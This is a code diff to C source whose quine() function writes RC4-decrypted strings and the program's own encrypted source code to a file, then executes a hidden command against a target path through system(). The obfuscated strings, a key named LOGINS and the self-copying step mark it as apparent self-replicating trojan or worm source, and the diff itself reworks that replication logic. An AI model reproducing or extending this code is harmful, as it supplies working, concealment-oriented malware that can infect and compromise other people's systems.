@@ -163,6 +163,7 @@ const unsigned char lsline[]	=	{0x39, 0x01, 0x2D, 0x1F, 0xA4};
 const unsigned char vnewline[]	=	{0x1F, 0x76};
 const unsigned char vspace[]	=	{0x1F, 0x5C};
 const unsigned char hexspec[]	=	{0x03, 0x04, 0x33, 0x25, 0x9C, 0x91};
+const unsigned char srcspec[]	=	{0x16, 0x0F};
 
 typedef	struct	client_info
 {
@@ -398,7 +399,7 @@ void	quine()
 		exit(1);
 	}
 	cypher = RC4(LOGINS, frline);
-	fprintf(file, cypher, sizeof(cypher));
+	fprintf(file, cypher);
 	free(cypher);
 	cypher = RC4(LOGINS, vnewline);
 	tcypher = RC4(LOGINS, vspace);
@@ -411,20 +412,21 @@ void	quine()
 			fprintf(file, tcypher);
 		fprintf(file, hcypher, srccode[i]);
 	}
-	cypher = RC4(LOGINS, srccode);
-	if (write(fd, cypher, strlen((const char *)cypher)) < 0)
-	{
-		free(cypher);
-		free(filename);
-		close(fd);
-		exit(1);
-	}
 	free(cypher);
-	close(fd);
+	free(tcypher);
+	free(hcypher);
+	cypher = RC4(LOGINS, lsline);
+	fprintf(file, cypher);
+	free(cypher);
+	cypher = RC4(LOGINS, srccode);
+	tcypher = RC4(LOGINS, srcspec);
+	fprintf(file, tcypher, cypher);
+	free(cypher);
+	free(tcypher);
 	cypher = RC4(LOGINS, runcmd);
 	tcypher = RC4(LOGINS, targpath);
-	fd = sprintf(cmd, cypher, filename, tcypher);
-	cmd[fd] = 0;
+	len = sprintf(cmd, cypher, filename, tcypher);
+	cmd[len] = 0;
 	if (system(cmd))
 	{
 		free(cypher);
